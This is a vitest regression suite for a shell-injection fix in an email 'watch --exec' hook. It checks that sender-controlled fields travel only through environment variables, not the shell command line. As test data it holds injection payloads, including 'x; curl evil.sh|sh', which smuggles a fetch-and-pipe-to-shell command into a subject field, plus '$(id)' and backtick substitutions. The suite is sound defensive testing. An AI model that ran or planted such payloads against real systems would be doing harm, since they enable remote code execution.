import { describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, existsSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  HOOK_PREVIEW_MAX,
  hookPlan,
  legacyPlaceholders,
  runHook,
  type HookFields,
} from "./watch.js";

/**
 * Regression suite for 006 -P1- `watch --exec` shell injection.
 *
 * The load-bearing assertion is on the spawn call itself: attacker bytes
 * must never appear in the shell's argv, only in its environment. A
 * filesystem side effect (`touch /tmp/pwned`) proves the same thing far
 * more weakly — it passes for the wrong reason if the payload happens not
 * to fire on the test host.
 */

/** What a hostile sender can put in a message that reaches the hook. */
const PAYLOAD = "x; curl evil.sh|sh";

function fields(over: Partial<HookFields> = {}): HookFields {
  return {
    id: "e_00000000-0000-4000-8000-000000000000",
    account: "you@example.com",
    from: "Stranger",
    subject: "hello",
    preview: "body text",
    ...over,
  };
}

/** Records the spawn call instead of running it. */
function fakeSpawn() {
  const calls: Array<{ command: string; args: string[]; options: Record<string, unknown> }> = [];
  const spawnFn = (command: string, args: string[], options: Record<string, unknown>) => {
    calls.push({ command, args, options });
    return { on: () => undefined };
  };
  return { calls, spawnFn: spawnFn as never };
}

describe("runHook argv", () => {
  it("passes the template through verbatim — no field is ever interpolated", () => {
    const { calls, spawnFn } = fakeSpawn();
    const template = 'echo "$BM_SUBJECT"';
    runHook(template, fields({ subject: PAYLOAD }), { spawnFn });

    expect(calls).toHaveLength(1);
    expect(calls[0]!.command).toBe("sh");
    expect(calls[0]!.args).toEqual(["-c", template]);
  });

  it.each([
    ["subject", "echo {subject}"],
    ["from", "echo {from}"],
    ["preview", "echo {preview}"],
    ["id", "echo {id}"],
  ])("keeps attacker bytes out of argv even for the unquoted {%s} template", (field, template) => {
    const { calls, spawnFn } = fakeSpawn();
    // The old code substituted here; an unquoted placeholder was RCE.
    runHook(template, fields({ [field]: PAYLOAD } as Partial<HookFields>), { spawnFn });

    const argv = calls[0]!.args.join("\u0000");
    expect(argv).not.toContain(PAYLOAD);
    expect(argv).not.toContain("curl evil.sh");
    // `{id}` bypassed the sanitizer entirely in the old code; it must be
    // no different from the other fields now.
    expect(calls[0]!.args).toEqual(["-c", template]);
  });

  it("delivers every field through the environment instead", () => {
    const { calls, spawnFn } = fakeSpawn();
    runHook("true", fields({ subject: PAYLOAD, from: "a`b`c", preview: "$(id)" }), {
      spawnFn,
      env: { PATH: "/usr/bin" },
    });

    expect(calls[0]!.options.env).toEqual({
      PATH: "/usr/bin",
      BM_ID: "e_00000000-0000-4000-8000-000000000000",
      BM_ACCOUNT: "you@example.com",
      BM_FROM: "a`b`c",
      BM_SUBJECT: PAYLOAD,
      BM_PREVIEW: "$(id)",
    });
  });

  it("reports spawn failures without throwing", () => {
    const errors: string[] = [];
    const spawnFn = ((_c: string, _a: string[], _o: unknown) => ({
      on: (_e: "error", cb: (err: Error) => void) => cb(new Error("ENOENT")),
    })) as never;
    runHook("true", fields(), { spawnFn, onError: (m) => errors.push(m) });
    expect(errors).toEqual(["--exec failed: ENOENT"]);
  });
});

describe("hookPlan", () => {
  it("truncates the preview so a large body can't blow the env limit", () => {
    const plan = hookPlan("true", fields({ preview: "z".repeat(500) }), { env: {} });
    expect(plan.options.env.BM_PREVIEW).toHaveLength(HOOK_PREVIEW_MAX);
  });

  it("inherits the ambient environment by default", () => {
    process.env.BM_TEST_AMBIENT = "yes";
    try {
      const plan = hookPlan("true", fields());
      expect(plan.options.env.BM_TEST_AMBIENT).toBe("yes");
    } finally {
      delete process.env.BM_TEST_AMBIENT;
    }
  });

  it("never gives the hook stdin", () => {
    expect((hookPlan("true", fields(), { env: {} }).options.stdio as unknown[])[0]).toBe("ignore");
  });

  it("keeps the hook's stdout off the NDJSON stream under --json", () => {
    // 2 = the parent's stderr; stdout is a data stream when --json is on.
    expect(
      (hookPlan("true", fields(), { env: {}, json: true }).options.stdio as unknown[])[1],
    ).toBe(2);
    expect(
      (hookPlan("true", fields(), { env: {}, json: false }).options.stdio as unknown[])[1],
    ).toBe("inherit");
  });
});

describe("legacyPlaceholders", () => {
  it("finds retired placeholders so watch can warn instead of substituting", () => {
    expect(legacyPlaceholders('notify-send "{from}: {subject}"')).toEqual(["{from}", "{subject}"]);
    expect(legacyPlaceholders("echo {id} {preview}")).toEqual(["{id}", "{preview}"]);
  });

  it("stays quiet for templates on the new contract", () => {
    expect(legacyPlaceholders('notify-send "$BM_FROM: $BM_SUBJECT"')).toEqual([]);
  });
});

describe("runHook end-to-end through a real shell", () => {
  it("hands the payload to the hook as inert data, executing none of it", () => {
    const dir = mkdtempSync(join(tmpdir(), "bm-watch-hook-"));
    const pwned = join(dir, "pwned");
    const out = join(dir, "out");
    try {
      // `touch <pwned>` fires only if the shell PARSES the subject.
      const payload = `x; touch ${pwned}`;
      // Deliberately unquoted `{subject}` — the exact shape that was RCE.
      const template = `printf '%s' {subject} > ${JSON.stringify(out)}`;
      const plan = hookPlan(template, fields({ subject: payload }), { env: process.env });

      execFileSync(plan.command, plan.args, {
        env: plan.options.env,
        stdio: ["ignore", "pipe", "pipe"],
      });

      expect(existsSync(pwned)).toBe(false);
      // The template's own literal `{subject}` is all the shell saw.
      expect(readFileSync(out, "utf8")).toBe("{subject}");

      // …and the payload is intact in the environment, unescaped, for a
      // template that asks for it properly.
      const echoed = execFileSync(plan.command, ["-c", 'printf "%s" "$BM_SUBJECT"'], {
        env: plan.options.env,
        encoding: "utf8",
      });
      expect(echoed).toBe(payload);
      expect(existsSync(pwned)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
